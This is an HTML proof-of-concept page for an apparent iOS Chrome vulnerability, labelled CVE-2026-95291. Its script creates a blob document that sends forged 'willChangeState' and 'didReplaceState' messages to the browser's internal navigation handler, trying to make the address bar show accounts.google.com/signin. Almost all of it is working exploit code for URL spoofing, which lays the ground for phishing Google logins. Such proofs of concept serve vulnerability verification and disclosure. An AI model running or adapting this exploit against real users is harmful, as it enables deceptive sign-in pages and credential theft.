<!doctype html>
<meta charset="utf-8">
<title>CVE-2026-95291 Test PoC</title>
<style>
  body { font-family: -apple-system, sans-serif; margin: 2em; background: #f4f4f9; color: #333; }
  .card { background: #fff; padding: 1.5em; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
  button { font-size: 16px; padding: 0.6em 1.2em; background: #007aff; color: #fff; border: none; border-radius: 4px; cursor: pointer; }
  button:hover { background: #005bb5; }
  #diag { font-family: Menlo, monospace; font-size: 12px; margin-top: 1.5em; white-space: pre-wrap; background: #eee; padding: 1em; border-radius: 4px; }
</style>
<div class="card">
  <h2>CVE-2026-95291 Verification PoC</h2>
  <p>Test if iOS Chrome allows cross-origin blob history state manipulation.</p>
  <button id="go">Run Exploit Test</button>
  <pre id="diag">Status: Ready.</pre>
</div>

<script>
function log(m) {
    document.getElementById('diag').textContent += '\n' + m;
    console.log('[poc] ' + m);
}

document.getElementById('go').onclick = function() {
    document.getElementById('diag').textContent = 'Starting test...';
    
    // Target victim domain to spoof
    var VICTIM = 'accounts.google.com';
    var spoofUrl = 'blob:https://' + VICTIM + '/signin';

    // Inner code for the blob document
    var blobHtml = `<!doctype html>
    <meta charset=utf-8>
    <script>
    setTimeout(function() {
        var mh = window.webkit && window.webkit.messageHandlers;
        if (!mh || !mh.NavigationEventMessage) {
            parent.postMessage('RESULT: SAFE (Handler missing or not iOS Chrome)', '*');
            return;
        }
        
        var fid = null;
        try {
            fid = window.__gCrWeb && window.__gCrWeb.getFrameId();
        } catch(e) {}

        if (!fid) {
            parent.postMessage('RESULT: SAFE (Could not retrieve frame_id)', '*');
            return;
        }

        try {
            // Attempting the forged state replacement attack
            mh.NavigationEventMessage.postMessage({ command: 'willChangeState', frame_id: fid });
            mh.NavigationEventMessage.postMessage({ 
                command: 'didReplaceState', 
                frame_id: fid, 
                stateObject: '', 
                baseUrl: 'https://x/', 
                pageUrl: '${spoofUrl}' 
            });
            parent.postMessage('RESULT: SENT (Check if address bar changed to ${VICTIM})', '*');
        } catch(err) {
            parent.postMessage('RESULT: SAFE (Post failed: ' + err.message + ')', '*');
        }
    }, 200);
    <\/script>`;

    // Create blob and navigate/iframe into it to test behavior
    var blob = new Blob([blobHtml], {type: 'text/html'});
    var blobUrl = URL.createObjectURL(blob);

    window.addEventListener('message', function(e) {
        log(e.data);
    });

    log('Navigating to blob URL: ' + blobUrl);
    location.href = blobUrl;
};
</script>
